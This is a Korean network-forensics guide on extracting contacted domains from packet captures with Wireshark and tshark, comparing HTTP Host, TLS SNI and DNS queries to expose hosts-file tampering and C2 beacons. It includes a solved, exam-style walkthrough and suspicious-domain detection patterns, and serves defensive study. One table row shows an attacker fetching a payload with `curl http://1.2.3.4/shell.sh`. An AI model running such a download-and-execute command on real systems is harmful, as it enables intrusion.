---
id: FOR-0160
title: "http.host 필터로 접속 도메인 전부 뽑기: 가상 호스트·IP 직접 접속·DNS 없는 Host"
slug: "http-host-filter"
category: "Network/PCAP"
type: "guide"
difficulty: "intermediate"
priority: "critical"
platform: [windows, linux]
artifact: ["pcap", "pcapng", "Host header", "TLS SNI", "hosts file"]
file_paths: ["C:\\Windows\\System32\\drivers\\etc\\hosts", "/etc/hosts"]
registry_paths: []
event_ids: []
protocols: ["HTTP", "TLS", "DNS", "TCP"]
tools: ["Wireshark", "tshark"]
commands: ["tshark -r c.pcapng -Y http.request -T fields -e http.host | sort | uniq -c | sort -nr", "tshark -r c.pcapng -Y tls.handshake.extensions_server_name -T fields -e tls.handshake.extensions_server_name | sort -u", "tshark -r c.pcapng -Y 'dns.flags.response == 0' -T fields -e dns.qry.name | sort -u"]
regex_patterns: ["^\\d{1,3}(\\.\\d{1,3}){3}(:\\d+)?$", "(?i)\\.(tk|top|xyz|gq|cf|ml|zip|mov)$"]
wireshark_filters: ["http.host", "http.host == \"shop.example.com\"", "http.host contains \"example\"", "http.host matches \"^[0-9.]+$\"", "http.host matches \"^[0-9.]+(:[0-9]+)?$\"", "!http.host && http.request", "http.host && !(http.host matches \"example\\\\.com$\")", "tls.handshake.extensions_server_name", "dns.qry.name", "http.host matches \"\\\\.(tk|top|xyz|gq)$\""]
tshark_fields: ["http.host", "http.request.uri", "http.request.full_uri", "ip.dst", "tcp.dstport", "tls.handshake.extensions_server_name", "dns.qry.name", "dns.a", "dns.cname", "frame.time_epoch"]
log_fields: []
file_formats: ["pcap", "pcapng"]
primary_terms: ["http.host", "호스트 필터", "접속 도메인 목록"]
keywords: ["http.host", "Host 헤더", "가상 호스트", "virtual host", "접속 도메인", "SNI", "DNS 질의", "hosts 파일", "IP 직접 접속", "C2 도메인"]
aliases: ["host 필터", "접속한 도메인 목록", "어디에 접속했나", "도메인 전부 뽑기", "sni 확인", "host 헤더 보기", "c2 도메인 찾기"]
symptom_keywords: ["접속한 도메인을 전부 알고 싶다", "DNS에는 없는 도메인이 나온다", "IP로만 접속한 요청이 있다", "같은 IP인데 사이트가 여러 개다", "HTTPS 도메인은 어떻게 보나"]
related: ["FOR-0156", "FOR-0159", "FOR-0157"]
source_ids: ["SRC-002", "SRC-064"]
last_verified: "2026-09-10"
status: "verified"
---

## 한 줄 결론

`http.host`는 **IP가 아니라 클라이언트가 "가려고 한 이름"** 이다. 빈도표로 전체 도메인을 뽑고, TLS의 SNI(`tls.handshake.extensions_server_name`)와 합쳐 HTTP/HTTPS 목록을 하나로 만든 뒤, **DNS 질의 집합과 차집합을 내면 hosts 파일·직접 IP 접속·하드코딩 C2가 즉시 드러난다.**

## 어떤 문제에서 필요한가

- "피해 PC가 접속한 모든 도메인을 나열하라"
- "C2 서버의 도메인을 구하라"
- "같은 IP에서 여러 사이트가 서비스되는데 어느 사이트로 갔는가"
- "악성 다운로드의 출처 도메인을 특정하라"
- "브라우저 History와 실제 트래픽이 일치하는가"
- "DNS 로그에는 없는 접속이 있는가"

**IP만으로는 답이 안 되는 문제가 많다.** 하나의 IP가 수백 개 도메인을 호스팅하는 CDN·공유 호스팅 환경에서 `ip.dst`는 정보량이 거의 없다. Host 헤더가 진짜 목적지다.

## 문제에서 처음 볼 단서

1. Protocol Hierarchy에 HTTP가 있다 → Host 헤더가 평문으로 남아 있다
2. `Statistics > Endpoints > IPv4`에 외부 IP가 몇 개뿐인데 요청은 수백 건 → **가상 호스트가 섞여 있다**
3. `Info` 컬럼에 `GET / HTTP/1.1`만 반복 → 경로가 아니라 Host로 구분해야 한다
4. DNS 질의는 5건인데 접속한 도메인이 8개 → **3개는 DNS 없이 접속했다**
5. 지문에 "도메인", "사이트", "C2", "명령제어", "출처"

## 30초 절차

```bash
tshark -r capture.pcapng -Y http.request -T fields -e http.host | sort | uniq -c | sort -nr
```

GUI라면 필터를 걸고 컬럼을 올린다.

```text
http.request
```

`http.host` 필드 우클릭 → `Apply as Column` → 컬럼 헤더 클릭으로 정렬. 또는 통계 창으로:

```text
Statistics > HTTP > Requests
```

이 창이 **호스트별 URI 트리**를 그대로 보여준다. 도메인 목록이 필요할 때 가장 빠른 GUI 경로다.

IP를 Host로 쓴 요청만 즉시 골라내기:

```text
http.host matches "^[0-9.]+(:[0-9]+)?$"
```

## 상세 절차

### 1단계 — Host 헤더가 무엇을 결정하는가

하나의 IP·하나의 포트에서 여러 사이트를 서비스하는 것이 **가상 호스트(virtual host)** 다. 서버는 TCP 연결만으로는 어느 사이트인지 알 수 없고, **요청의 `Host` 헤더를 보고 갈라낸다.**

| 요청 | `ip.dst` | `http.host` | 서버가 응답하는 사이트 |
| --- | --- | --- | --- |
| `GET / HTTP/1.1` + `Host: shop.example.com` | 93.184.216.34 | `shop.example.com` | 쇼핑몰 |
| `GET / HTTP/1.1` + `Host: blog.example.com` | 93.184.216.34 | `blog.example.com` | 블로그 |
| `GET / HTTP/1.1` + `Host: 93.184.216.34` | 93.184.216.34 | `93.184.216.34` | 기본 사이트(default vhost) |

**세 요청의 IP·포트·URI가 모두 같지만 서로 다른 사이트다.** 그래서 `ip.dst == 93.184.216.34` 로는 문제를 풀 수 없다.

HTTP/1.1에서 `Host`는 필수 헤더다. 없으면 서버는 `400 Bad Request`로 응답해야 한다. 따라서:

```text
http.request && !http.host
```

이 필터에 걸린 요청은 **HTTP/1.0 클라이언트이거나, 헤더를 직접 조립한 스크립트/도구다.** 그 자체가 이상 신호다.

### 2단계 — 접속 도메인 전체 목록을 빈도순으로

```bash
# HTTP Host 빈도표
tshark -r capture.pcapng -Y 'http.request' -T fields -e http.host |
  sort | uniq -c | sort -nr
```

```text
    412 shop.example.com
     97 cdn.example.com
     31 api.example.com
     14 www.google-analytics.com
      6 update.microsoft.com
      3 cdn-static-7f2a.top
      2 10.0.0.250
      1 192.168.56.101:8080
```

| 관찰 | 해석 |
| --- | --- |
| 상위 = 본 사이트와 CDN·분석 스크립트 | 정상 배경 |
| **하위(1~3회) 도메인** | 특이 접속. **여기에 답이 있다** |
| `.top` `.xyz` `.tk` `.gq` `.cf` `.ml` 같은 저가 TLD | 악성 인프라에서 흔하다 |
| 무작위 문자열이 섞인 서브도메인 (`cdn-static-7f2a`) | DGA/위장 도메인 후보 |
| **Host가 IP** | 이름 없이 직접 접속. **강한 의심 신호** |
| Host에 포트가 붙어 있다 (`host:8080`) | 비표준 포트 서비스 |
| 내부 이름(`10.0.0.250`, `srv-file01`) | 내부 이동(lateral movement) |

Host + URI를 함께 집계하면 각 도메인에서 무엇을 했는지 한 표에 나온다.

```bash
tshark -r capture.pcapng -Y 'http.request' \
  -T fields -e http.host -e http.request.method -e http.request.uri |
  sort | uniq -c | sort -nr | head -40
```

특정 도메인만 파고들 때:

```text
http.host == "cdn-static-7f2a.top"
http.host contains "7f2a"
http.host matches "\\.(tk|top|xyz|gq|cf|ml)$"
```

**정상 도메인을 제외해 남는 것만 보는 전략**이 가장 효율적이다.

```text
http.request && !(http.host matches "(example\\.com|microsoft\\.com|google(-analytics)?\\.com|windowsupdate\\.com)$")
```

### 3단계 — Host가 IP인 요청: 도메인 없이 직접 접속

```text
http.host matches "^[0-9.]+(:[0-9]+)?$"
```

IPv6까지 포함하려면 콜론이 들어간 형태도 봐야 하므로, 더 단순하게 "점과 숫자와 콜론만으로 이루어진 Host"를 잡는다.

```text
http.host matches "^[0-9a-fA-F:.\\[\\]]+(:[0-9]+)?$"
```

**왜 의심스러운가.** 사람이 브라우저로 사이트를 방문하면 도메인 이름을 쓴다. Host가 IP라는 것은 다음 중 하나다.

| 경우 | 판정 |
| --- | --- |
| 멀웨어가 IP를 하드코딩해 비컨을 보낸다 | **악성. 도메인 등록·DNS 로그를 우회하려는 의도** |
| 공격자가 `curl http://1.2.3.4/shell.sh` 로 페이로드를 받는다 | **악성** |
| 내부 관리 인터페이스 직접 접속 (`http://10.0.0.250`) | 정상일 수 있으나 내부 이동 확인 필요 |
| 스캐너가 IP 범위를 훑는다 | 정찰 |
| 프린터·NAS·라우터 등 장비의 자체 갱신 | 정상 배경 |

동일한 확인을 TLS 측에서도 한다. **SNI 없이 IP로 붙는 TLS 연결**은 같은 의미의 신호다.

```text
tls.handshake.type == 1 && !tls.handshake.extensions_server_name
```

### 4단계 — 비정상 Host 판정 기준

| 패턴 | 예 | 왜 이상한가 |
| --- | --- | --- |
| 내부 호스트명 | `srv-file01`, `dc01.corp.local` | 외부 캡처 구간에 나올 이유가 없다. 내부 이동 흔적 |
| 오타 도메인(typosquatting) | `micros0ft.com`, `goggle.com`, `exarnple.com` | 피싱/워터링홀. **문자 치환(o↔0, l↔1, rn↔m)** 을 눈으로 확인 |
| 정상 도메인 + 낯선 서브도메인 | `update.microsoft.com.evil.tld` | **마지막 두 레이블이 진짜 소유자다.** 앞부분은 위장 |
| 하이픈·숫자 뒤범벅 서브도메인 | `a7f2b91c3d.cdn-node.xyz` | DGA(도메인 생성 알고리즘) 후보 |
| Punycode | `xn--pple-43d.com` | 유니코드 유사 문자 피싱. **디코딩해서 확인** |
| 긴 Base32/Base64 서브도메인 | `MFRGG2LOF4.tunnel.tld` | DNS 터널링과 같은 계열의 데이터 은닉 |
| Host와 실제 IP의 불일치 | `Host: www.naver.com` → `ip.dst` 가 사설 IP | **hosts 파일 조작 또는 DNS 스푸핑** |

마지막 항목을 잡는 방법:

```bash
# Host 와 실제 목적지 IP 를 나란히 놓고 본다
tshark -r capture.pcapng -Y 'http.request' \
  -T fields -e frame.number -e http.host -e ip.dst -e tcp.dstport |
  sort -u -k2 | head -40
```

```text
221   shop.example.com    93.184.216.34   80
1902  www.naver.com       192.168.56.101  80     <-- 유명 도메인이 사설 IP 로 향한다
2455  cdn-static-7f2a.top 45.155.204.11   80
```

**유명 도메인이 사설/낯선 IP로 향하면 hosts 파일 또는 DNS 응답이 조작된 것이다.**

### 5단계 — DNS 질의 없이 나타난 Host

정상적인 접속은 **DNS 질의 → 응답 IP → TCP 연결 → Host 헤더** 순서를 밟는다. 이 사슬이 끊긴 곳이 단서다.

```bash
# 1) 접속한 이름 집합 (HTTP Host + TLS SNI)
{ tshark -r capture.pcapng -Y 'http.request' -T fields -e http.host
  tshark -r capture.pcapng -Y 'tls.handshake.extensions_server_name' \
    -T fields -e tls.handshake.extensions_server_name
} | tr 'A-Z' 'a-z' | sed 's/:[0-9]*$//' | grep . | sort -u > names.txt

# 2) DNS 로 질의한 이름 집합
tshark -r capture.pcapng -Y 'dns.flags.response == 0' -T fields -e dns.qry.name |
  tr 'A-Z' 'a-z' | grep . | sort -u > dns.txt

# 3) 차집합 — 질의 없이 접속한 이름
comm -23 names.txt dns.txt
```

```text
10.0.0.250
cdn-static-7f2a.top
srv-file01
```

원인은 셋 중 하나다.

| 원인 | 근거 | 다음 확인 |
| --- | --- | --- |
| **`hosts` 파일에 등록되어 있다** | 이름 → IP 매핑이 로컬에 있어 질의가 발생하지 않는다 | `C:\Windows\System32\drivers\etc\hosts`, `/etc/hosts` |
| **DNS 캐시에 이미 있었다** | 캡처 시작 전에 질의가 끝났다 | `ipconfig /displaydns`, `Get-DnsClientCache` |
| **캡처 구간이 질의를 포함하지 않는다** | 캡처가 중간부터 시작됐다 | `Statistics > Capture File Properties` 의 시간 범위 |
| 다른 리졸버·암호화 DNS를 썼다 | DoH/DoT(443/853)로 질의해 평문 DNS가 없다 | `tls` 대상 IP가 공개 DoH 서비스인지 |

반대 방향의 차집합도 의미가 있다.

```bash
# 질의는 했으나 접속하지 않은 이름 — 정찰/실패한 해석
comm -13 names.txt dns.txt | head -20
```

디스크 이미지가 함께 주어진 문제라면 hosts 파일을 직접 확인하는 것이 결정적 근거가 된다.

```powershell
Get-Content 'C:\Windows\System32\drivers\etc\hosts' | Where-Object { $_ -notmatch '^\s*#' -and $_ -match '\S' }
```

```bash
grep -vE '^\s*(#|$)' /etc/hosts
```

### 6단계 — TLS SNI와 합쳐 HTTP/HTTPS를 한 목록으로

HTTPS는 본문을 못 봐도 **어디로 갔는지는 평문으로 남는다.** TLS ClientHello의 SNI 확장이 그것이다.

```text
tls.handshake.extensions_server_name
tls.handshake.extensions_server_name contains "example"
```

| 프로토콜 | 목적지 이름이 담긴 필드 | 비고 |
| --- | --- | --- |
| HTTP | `http.host` | 평문. 요청마다 있다 |
| HTTPS / TLS | `tls.handshake.extensions_server_name` | **ClientHello 에만** 있다. 세션 재개 시 없을 수 있다 |
| HTTPS 인증서 | `x509sat.uTF8String` 등 인증서 필드 | Subject CN/SAN. TLS 1.3에서는 암호화되어 안 보인다 |
| QUIC / HTTP3 | `quic` + SNI (복호화 가능 시) | UDP 443 |
| DNS | `dns.qry.name` | 이름 해석 시도 |

통합 목록을 만드는 명령:

```bash
{ tshark -r capture.pcapng -Y 'http.request' -T fields -e frame.time_epoch -e http.host \
    | awk -F'\t' '{print $1"\tHTTP\t"$2}'
  tshark -r capture.pcapng -Y 'tls.handshake.extensions_server_name' \
    -T fields -e frame.time_epoch -e tls.handshake.extensions_server_name \
    | awk -F'\t' '{print $1"\tTLS\t"$2}'
} | sort -n | head -40
```

```text
1773472502.118   HTTP   shop.example.com
1773472503.902   TLS    www.google-analytics.com
1773472561.334   TLS    cdn-static-7f2a.top
1773472588.771   HTTP   cdn-static-7f2a.top
```

**같은 도메인이 TLS와 HTTP에 모두 나타나면 폴백 또는 이중 채널이다.** 시간순으로 보면 어느 쪽이 먼저였는지, 즉 어느 채널이 주 통로였는지 판정할 수 있다.

epoch를 사람이 읽는 시각으로:

```bash
date -u -d @1773472561 '+%Y-%m-%d %H:%M:%S UTC'
```

```powershell
[DateTimeOffset]::FromUnixTimeSeconds(1773472561).UtcDateTime
```

Unix epoch는 1970-01-01 UTC 기준 초다. KST는 UTC+9이므로 표시된 UTC 시각에 9시간을 더한다.

### 7단계 — 브라우저 History와 대조

pcap의 Host 목록과 디스크의 브라우저 기록을 맞대면 **"사용자가 직접 방문했는가 / 프로그램이 배후에서 접속했는가"** 가 갈린다.

| pcap의 Host | 브라우저 History | 판정 |
| --- | --- | --- |
| 있다 | 있다 (typed 전이) | 사용자가 주소창에 직접 입력 |
| 있다 | 있다 (link 전이) | 링크 클릭으로 유입. Referer와 일치해야 한다 |
| 있다 | **없다** | **브라우저가 아닌 프로세스의 접속.** 멀웨어/스크립트/업데이터 |
| 없다 | 있다 | 캡처 구간 밖의 방문, 또는 캐시로 처리됨 |

브라우저 기록 읽는 절차는 [FOR-0191](./chrome-history.html)에 있다. `Referer`가 함께 남아 있으면 유입 경로를 이어 붙일 수 있다 ([FOR-0157](./http-get-find.html)).

## 출력 필드 해석

| 필드 | 값의 예 | 주의 |
| --- | --- | --- |
| `http.host` | `shop.example.com` | **포트가 붙을 수 있다** (`host:8080`). 비교 시 고려 |
| `http.request.full_uri` | `http://shop.example.com/a` | Host + URI 합성값 |
| `ip.dst` | `93.184.216.34` | Host와 다를 수 있다. 불일치가 단서 |
| `tcp.dstport` | `80`, `8080` | Host의 포트와 일치하는지 확인 |
| `tls.handshake.extensions_server_name` | `www.example.com` | ClientHello 에만. **세션 재개 시 없다** |
| `dns.qry.name` | `shop.example.com` | 질의한 이름 |
| `dns.a` | `93.184.216.34` | 응답 A 레코드 |
| `dns.cname` | `shop.example.com.cdn.net` | CNAME 체인. 최종 이름이 다를 수 있다 |
| `frame.time_epoch` | `1773472502.118` | 1970-01-01 UTC 기준 초 |

Host 값 비교 시 세 가지를 정규화해야 표가 맞는다.

1. **대소문자** — 도메인은 대소문자를 구분하지 않는다. `Shop.Example.com`과 `shop.example.com`은 같다. 비교 전에 소문자로 변환한다
2. **포트** — `host:8080`과 `host`는 같은 이름이다. `sed 's/:[0-9]*$//'`로 잘라낸다
3. **끝의 점** — DNS 질의 이름은 `example.com.`처럼 루트 점이 붙어 나올 수 있다. `sed 's/\.$//'`

```bash
tshark -r capture.pcapng -Y 'http.request' -T fields -e http.host |
  tr 'A-Z' 'a-z' | sed -e 's/:[0-9]*$//' -e 's/\.$//' | sort -u
```

## pivot: 다음에 볼 artifact

| Host에서 얻은 것 | 다음 목표 | 확인할 것 |
| --- | --- | --- |
| 의심 도메인 | 그 Host의 모든 요청 (`http.host == "..."`) | URI·메서드·전송량 |
| 의심 도메인 | 해당 URI 분석 ([FOR-0159](./http-request-uri-filter.html)) | 다운로드/명령 경로 |
| 의심 도메인 | `dns.qry.name == "..."` + `dns.a` | 해석된 IP와 TTL |
| Host↔IP 불일치 | `hosts` 파일, DNS 캐시 | 로컬 조작 여부 |
| DNS 없는 Host | 디스크의 `hosts` 파일, 프로세스 목록 | 하드코딩 C2 |
| Host가 IP | 그 IP의 전체 대화 (`ip.addr == ...`) | 비컨 주기·전송량 |
| 도메인 목록 | 브라우저 History ([FOR-0191](./chrome-history.html)) | 사용자 방문 vs 배후 접속 |
| 도메인 목록 | 서버 접근 로그 ([FOR-0121](./powershell-select-string.html)) | 서버 측 기록과 대조 |
| 접속 시각 | 그 시각 ±5분의 모든 artifact | 실행·파일 생성과의 인과 |
| 전송량 큰 Host | `Statistics > Conversations` | 유출량 ([FOR-0164](./tcp-stream-filter.html)) |

## 흔한 함정

- **`ip.dst`로 사이트를 판정하는 것.** 하나의 IP가 수백 도메인을 서비스한다(CDN·공유 호스팅). 사이트 판정은 `http.host` 또는 SNI로 한다.
- **`http.host`에 포트가 붙는 것을 잊는 것.** `Host: 10.0.0.5:8080` 이면 `http.host == "10.0.0.5"` 는 거짓이다. `contains` 또는 `matches`로 쓰거나 포트를 잘라 비교한다.
- **대소문자를 구분해 비교하는 것.** 도메인은 대소문자를 구분하지 않지만 `contains`는 구분한다. `matches`를 쓰거나 소문자로 정규화한다.
- **HTTPS 도메인을 포기하는 것.** 본문은 못 봐도 SNI(`tls.handshake.extensions_server_name`)는 평문이다. 접속 도메인 목록에서 HTTPS를 빼면 목록이 반쪽이 된다.
- **SNI가 없다고 도메인이 없다고 판단하는 것.** TLS 세션 재개(session resumption)나 IP 직접 접속에서는 SNI가 없다. 그 자체가 신호이므로 `tls.handshake.type == 1 && !tls...server_name` 으로 따로 센다.
- **`Host: update.microsoft.com.evil.tld` 를 마이크로소프트로 읽는 것.** 도메인의 소유자는 **뒤에서 두 번째 레이블부터** 결정된다. 앞부분은 아무나 붙일 수 있다.
- **DNS 질의가 없으면 접속이 없었다고 결론내는 것.** hosts 파일, DNS 캐시, 하드코딩 IP, 암호화 DNS(DoH/DoT)로 질의 없이 접속할 수 있다. 차집합을 반드시 낸다.
- **빈도표 상위만 보는 것.** C2 비컨은 트래픽이 작아 목록 최하단에 있다. **1~3회 등장한 도메인을 전수로 훑는다.**
- **`http.request && !http.host` 를 건너뛰는 것.** HTTP/1.1에서 Host는 필수다. 없는 요청은 직접 조립된 요청이며 그 자체가 이상 신호다.
- **오타 도메인을 눈으로 놓치는 것.** `rn`↔`m`, `0`↔`o`, `1`↔`l`, `vv`↔`w`. 목록을 알파벳순으로 정렬해 정상 도메인 바로 옆에 오도록 놓으면 잘 보인다.
- **Punycode를 디코딩하지 않는 것.** `xn--`으로 시작하는 Host는 유니코드 도메인이다. 유사 문자 피싱을 판정하려면 디코딩해야 한다.
- **시간을 상대 초로 두는 것.** 다른 artifact와 대조하려면 `View > Time Display Format > UTC Date and Time of Day`가 먼저다. KST = UTC+9.

## 교차검증

```bash
# 1) HTTP Host 고유 목록
tshark -r capture.pcapng -Y 'http.request' -T fields -e http.host |
  tr 'A-Z' 'a-z' | sed 's/:[0-9]*$//' | sort -u

# 2) TLS SNI 고유 목록
tshark -r capture.pcapng -Y 'tls.handshake.extensions_server_name' \
  -T fields -e tls.handshake.extensions_server_name | tr 'A-Z' 'a-z' | sort -u

# 3) DNS 질의 고유 목록
tshark -r capture.pcapng -Y 'dns.flags.response == 0' \
  -T fields -e dns.qry.name | tr 'A-Z' 'a-z' | sort -u

# 4) Host 와 목적지 IP 짝 — 불일치 탐지
tshark -r capture.pcapng -Y 'http.request' -T fields -e http.host -e ip.dst | sort -u

# 5) DNS 응답의 이름↔IP 짝 — 4)와 맞대면 스푸핑이 보인다
tshark -r capture.pcapng -Y 'dns.flags.response == 1 && dns.a' \
  -T fields -e dns.qry.name -e dns.a | sort -u

# 6) 파서를 우회한 Host 헤더 원문
strings -n 8 capture.pcapng | grep -i '^Host: ' | sort -u

# 7) GUI 대조
#    Statistics > HTTP > Requests   (호스트별 URI 트리)
#    Statistics > Endpoints > IPv4  (실제 통신 상대 IP)
```

6)이 1)보다 많으면 HTTP로 파싱되지 않은 요청이 있다(비표준 포트·잘린 캡처). 4)와 5)를 맞대어 이름↔IP가 어긋나면 hosts 조작이나 DNS 스푸핑이다.

## mini walkthrough

```text
문제:
"감염 PC 가 명령을 받아온 C2 서버의 도메인을 구하세요."
첨부: infected.pcapng (23,410 packets, 18 MB)

1. 첫 시도 (실패):
   "C2 도메인이니 DNS 질의에 있을 것"이라고 보고
   필터: dns.flags.response == 0

   tshark -r infected.pcapng -Y 'dns.flags.response == 0' \
     -T fields -e dns.qry.name | sort -u

   shop.example.com
   cdn.example.com
   www.google-analytics.com
   ocsp.digicert.com
   update.microsoft.com

   -> 5개 전부 정상 도메인. C2 로 보이는 것이 없다.
      여기서 "도메인이 아니라 IP 하드코딩이겠다"고 단정하고
      ip.dst 목록만 뒤진 것이 시간 낭비였다.

2. 관점 변경 — DNS 가 아니라 실제로 보낸 Host 를 본다
   tshark -r infected.pcapng -Y 'http.request' -T fields -e http.host |
     sort | uniq -c | sort -nr

      412 shop.example.com
       97 cdn.example.com
       31 www.google-analytics.com
      288 cdn-static-7f2a.top       <-- DNS 질의 목록에 없다
        2 10.0.0.250

   -> cdn-static-7f2a.top 이 288회. 트래픽은 많은데 DNS 질의는 0건.

3. 차집합으로 확정
   { tshark -r infected.pcapng -Y 'http.request' -T fields -e http.host
     tshark -r infected.pcapng -Y 'tls.handshake.extensions_server_name' \
       -T fields -e tls.handshake.extensions_server_name
   } | tr 'A-Z' 'a-z' | sed 's/:[0-9]*$//' | grep . | sort -u > names.txt
   tshark -r infected.pcapng -Y 'dns.flags.response == 0' \
     -T fields -e dns.qry.name | tr 'A-Z' 'a-z' | grep . | sort -u > dns.txt
   comm -23 names.txt dns.txt

   10.0.0.250
   cdn-static-7f2a.top

   -> 질의 없이 접속한 이름 두 개.

4. 왜 질의가 없었나 — Host 와 IP 를 맞대 본다
   tshark -r infected.pcapng -Y 'http.host contains "7f2a"' \
     -T fields -e frame.number -e http.host -e ip.dst -e tcp.dstport | sort -u | head -3

   3102  cdn-static-7f2a.top  45.155.204.11  80

   외부 IP 이고, DNS 질의가 없으므로 hosts 파일 등록 또는 사전 캐시.
   디스크 이미지가 함께 주어졌다면:
     Get-Content 'C:\Windows\System32\drivers\etc\hosts'
     45.155.204.11   cdn-static-7f2a.top
   -> hosts 파일 조작 확인.

5. C2 답게 행동하는지 검증 — 비컨 주기
   tshark -r infected.pcapng -Y 'http.host contains "7f2a" && http.request' \
     -T fields -e frame.time_epoch -e http.request.uri |
     awk -F'\t' 'NR>1{printf "%.1f\t%s\n", $1-p, $2} {p=$1}' | head -6

   60.0   /api/task?id=WKS07
   60.1   /api/task?id=WKS07
   59.9   /api/task?id=WKS07
   60.0   /api/task?id=WKS07

   -> 정확히 60초 주기의 동일 요청. 사람의 브라우징이 아니다. 비컨 확정.

6. 브라우저 History 대조 (디스크 이미지 동반 시)
   Chrome History 의 urls 테이블에 cdn-static-7f2a.top 이 없다.
   -> 브라우저가 아닌 프로세스의 접속.  (FOR-0191)

7. 시각 확정
   date -u -d @1773472561 '+%Y-%m-%d %H:%M:%S UTC'
   2026-03-14 07:16:01 UTC   = 16:16:01 KST

정답: cdn-static-7f2a.top  (45.155.204.11, hosts 파일 등록, 60초 비컨)
```

1단계의 실패가 핵심이다. **DNS 질의 목록은 "접속한 도메인 목록"이 아니다.** hosts 파일·캐시·하드코딩 때문에 항상 부분집합이거나 어긋난다. 접속한 이름의 진짜 출처는 `http.host`와 TLS SNI이고, **DNS와의 차집합이 곧 은닉 신호**다.

## 막혔을 때 다음 체크

1. `http.host` 빈도표를 뽑았는가 — 그리고 **하위 1~3회 항목**을 봤는가
2. TLS SNI(`tls.handshake.extensions_server_name`) 목록을 합쳤는가 — HTTPS를 빼면 반쪽이다
3. `Statistics > HTTP > Requests` 로 호스트별 URI 트리를 봤는가
4. Host 목록과 DNS 질의 목록의 **차집합**을 냈는가
5. Host가 IP인 요청(`matches "^[0-9.]+"`)을 확인했는가
6. `http.request && !http.host` 를 확인했는가
7. Host와 `ip.dst` 를 나란히 놓고 **불일치**를 찾았는가
8. 오타 도메인·Punycode(`xn--`)·저가 TLD를 눈으로 훑었는가
9. Host를 **소문자로 정규화하고 포트를 잘라내고** 비교했는가
10. 의심 Host의 요청 주기가 기계적으로 일정한가 — 비컨 판정
11. SNI 없는 TLS 연결(`tls.handshake.type == 1 && !tls.handshake.extensions_server_name`)이 있는가
12. 디스크가 있다면 `hosts` 파일과 DNS 캐시를 확인했는가
13. 브라우저 History와 대조했는가 ([FOR-0191](./chrome-history.html))
14. 시간을 UTC 절대시각으로 바꿨는가 (KST = UTC+9)

## 출처

- SRC-002 — Wireshark Display Filter Reference: `http.host`, `http.request.full_uri`, `tls.handshake.extensions_server_name`, `dns.qry.name`, `dns.a`, `dns.cname` 필드 정의와 문자열 비교 연산자 동작
- SRC-064 — RFC 9110 HTTP Semantics: `Host` 헤더의 필수성과 의미, 가상 호스트 구분에서의 역할, request-target과 `Host`의 관계
- `Statistics > HTTP > Requests` 메뉴 위치와 창 구성은 Wireshark 버전에 따라 다를 수 있으므로 실제 화면에서 확인할 것
- TLS 1.3에서 인증서가 암호화되어 Subject CN/SAN을 볼 수 없다는 점, 세션 재개 시 SNI가 없을 수 있다는 점은 캡처마다 다르다. SNI가 비어 있을 때 인증서 필드를 대안으로 쓸 수 있는지는 실제 캡처에서 확인할 것
- 저가 TLD(`.tk` `.top` `.xyz` 등) 목록은 시대에 따라 바뀐다. 목록 자체가 아니라 "정상 트래픽에서 보기 드문 TLD"라는 판정 기준으로 쓸 것
